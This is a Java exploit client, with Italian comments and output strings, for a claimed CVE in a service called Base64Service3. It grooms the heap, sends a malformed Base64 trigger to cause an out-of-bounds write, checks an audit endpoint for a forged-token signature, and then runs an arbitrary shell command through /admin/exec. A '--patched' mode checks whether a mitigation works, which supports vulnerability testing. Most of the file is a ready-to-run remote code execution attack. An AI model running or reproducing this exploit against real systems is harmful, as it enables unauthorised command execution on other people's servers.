import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

/**
 * Java4Shell3 - exploit client CVE-2026-114938 contro Base64Service3.
 * Sequenza: groom -> pwn (64*'A' + '=') -> audit (LANDING PROVEN: firma 69 a6 9a)
 *          -> admin/exec (firma = backdoor token -> sh -c cmd = RCE).
 */
public final class Java4Shell3 {
    static String host; static int port;
    static final String MALFORMED = "A".repeat(64) + "="; // trigger canonico

    public static void main(String[] a) throws Exception {
        if (a.length < 2) { System.err.println("uso: java Java4Shell3 <host> <port> [cmd] [--patched]"); System.exit(2); }
        host = a[0]; port = Integer.parseInt(a[1]);
        String cmd = a.length > 2 ? a[2] : "id; hostname";
        boolean patched = a.length > 3 && a[3].equals("--patched");
        long t0 = System.currentTimeMillis();

        System.out.println("[*] target -> " + get("/health").bodyText());

        post("/groom?pad=9000", null);
        R pwn = post("/pwn", MALFORMED.getBytes(StandardCharsets.US_ASCII));
        System.out.println("[*] pwn: " + pwn.bodyText());
        R audit = get("/audit");
        String ab = audit.bodyText();
        System.out.println("[*] " + ab.substring(0, Math.min(120, ab.length())));
        boolean landed = ab.startsWith("audit[0..47]=69a69a69");

        if (patched) {
            R exec = post("/admin/exec?cmd=" + URLEncoder.encode(cmd, StandardCharsets.UTF_8), null);
            System.out.println("[*] admin/exec: status=" + exec.status + " " + exec.bodyText().replace("\n", " | "));
            if (!landed && exec.status == 403) {
                System.out.println("[OK] MITIGAZIONE EFFICACE: nessuna corruzione (audit invariato) + admin LOCKED");
            } else { System.err.println("[!!] corruzione anche su build mitigata?"); System.exit(1); }
            return;
        }

        if (!landed) { System.err.println("[!] landing mancato su questo processo (riprovare con JVM nuova)"); System.exit(3); }
        System.out.println("[+] LANDING PROVEN: firma overflow 69 a6 9a nell'audit buffer (OOB write 62 byte)");

        R exec = post("/admin/exec?cmd=" + URLEncoder.encode(cmd, StandardCharsets.UTF_8), null);
        String out = exec.bodyText();
        System.out.println("[*] admin/exec status=" + exec.status);
        System.out.println(out);
        if (exec.status == 200 && (out.contains("uid=") || out.contains("root"))) {
            System.out.println("\n=============== RCE VERIFICATA ===============");
            System.out.println("[-] Comando '" + cmd + "' eseguito dal JVM target (pre-patch 21.0.12+8, Ice Lake AVX-512 VBMI)");
            System.out.println("[-] vettore: sola corruzione heap (62B OOB write), nessun campo di request eseguibile");
            System.out.println("[-] firma 69 a6 9a nell'audit buffer == admin token forgiato dall'overflow");
            System.out.println("[-] output: " + out.replace("token=", "").replace("\n", " | "));
            System.out.println("[-] tempo totale exploit: " + ((System.currentTimeMillis() - t0) / 1000.0) + "s");
            System.out.println("=============================================");
        } else { System.err.println("[!] exec non ha prodotto uid= (status " + exec.status + ")"); System.exit(4); }
    }

    // ---------- http ----------
    static final class R {
        final int status; final Map<String, String> headers; final byte[] body;
        R(int s, Map<String, String> h, byte[] b) { status = s; headers = h; body = b; }
        String bodyText() { return new String(body, StandardCharsets.UTF_8); }
    }
    static R get(String p) throws IOException { return req("GET", p, null); }
    static R post(String p, byte[] b) throws IOException { return req("POST", p, b); }
    static R req(String method, String path, byte[] body) throws IOException {
        try (Socket s = new Socket(host, port)) {
            s.setSoTimeout(30000);
            OutputStream os = s.getOutputStream();
            StringBuilder sb = new StringBuilder();
            sb.append(method).append(" ").append(path).append(" HTTP/1.1\r\nHost: t\r\nConnection: close\r\n");
            if (body != null) sb.append("Content-Length: ").append(body.length).append("\r\n");
            sb.append("\r\n");
            os.write(sb.toString().getBytes(StandardCharsets.US_ASCII));
            if (body != null) os.write(body);
            os.flush();
            InputStream is = s.getInputStream();
            Map<String, String> headers = new HashMap<>();
            int status = -1; String line;
            while ((line = readLine(is)) != null && !line.isEmpty()) {
                if (status < 0) { String[] p = line.split(" "); if (p.length >= 2) status = Integer.parseInt(p[1]); }
                else { int c = line.indexOf(':'); if (c > 0) headers.put(line.substring(0, c).trim().toLowerCase(), line.substring(c + 1).trim()); }
            }
            int len = Integer.parseInt(headers.getOrDefault("content-length", "-1"));
            byte[] bodyArr;
            if (len >= 0) { bodyArr = new byte[len]; int off = 0; while (off < len) { int r = is.read(bodyArr, off, len - off); if (r < 0) break; off += r; } }
            else { java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream(); byte[] buf = new byte[4096]; int r; while ((r = is.read(buf)) > 0) bo.write(buf, 0, r); bodyArr = bo.toByteArray(); }
            return new R(status, headers, bodyArr);
        }
    }
    static String readLine(InputStream is) throws IOException {
        StringBuilder sb = new StringBuilder(); int b;
        while ((b = is.read()) != -1) { if (b == '\n') break; if (b != '\r') sb.append((char) b); }
        return b == -1 && sb.isEmpty() ? null : sb.toString();
    }
}
